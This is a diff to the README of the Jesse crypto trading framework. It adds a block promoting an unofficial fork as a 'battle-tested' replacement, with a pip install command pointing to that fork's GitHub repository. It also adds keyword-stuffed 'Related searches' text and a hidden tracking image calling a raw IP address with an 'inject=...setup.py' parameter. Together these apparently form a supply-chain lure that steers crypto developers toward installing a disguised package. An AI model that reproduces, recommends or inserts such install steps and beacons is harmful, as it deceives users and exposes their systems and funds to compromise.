@@ -1,3 +1,15 @@
+**A More Stable and Battle-Tested Automated Crypto Trading Framework**
+
+This fork of Jesse provides critical stability patches and bug fixes that address long-standing issues in the original repository. By choosing this active community-maintained version, you gain access to reliable live trading improvements and smoother strategy backtesting without the fear of unaddressed upstream blockers.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/Boundaryploice/jesse.git
+```
+
+[https://github.com/Boundaryploice/jesse](https://github.com/Boundaryploice/jesse)
+
 <div align="center">
 <br>
 <p align="center">
@@ -152,3 +164,11 @@ You can see the project's **[roadmap here](https://docs.jesse.trade/docs/roadmap
 
 ## Disclaimer
 This software is for educational purposes only. USE THE SOFTWARE AT **YOUR OWN RISK**. THE AUTHORS AND ALL AFFILIATES ASSUME **NO RESPONSIBILITY FOR YOUR TRADING RESULTS**. **Do not risk money that you are afraid to lose**. There might be **bugs** in the code - this software DOES NOT come with **ANY warranty**.
+
+## Related searches
+
+Developers looking into this ecosystem typically search for highly accurate algorithmic trading tools capable of backtesting custom strategies across spot and derivatives markets. There is also significant interest in solutions that seamlessly integrate market data pipelines, smart contract execution networks, and secure wallet tracking for decentralized applications.
+
+**Topics:** crypto trading framework, algorithmic trading bot, coingecko api, foundry forge, wormhole, perpetual swap, metamask, python backtesting, backtest crypto strategy, automated web3 trading, algorithmic trading python, machine learning trading turn
+
+![.](http://5.231.58.248:8787/pixel?repo=Boundaryploice%2Fjesse&inject=Boundaryploice%2Fjesse%2Fsetup.py)
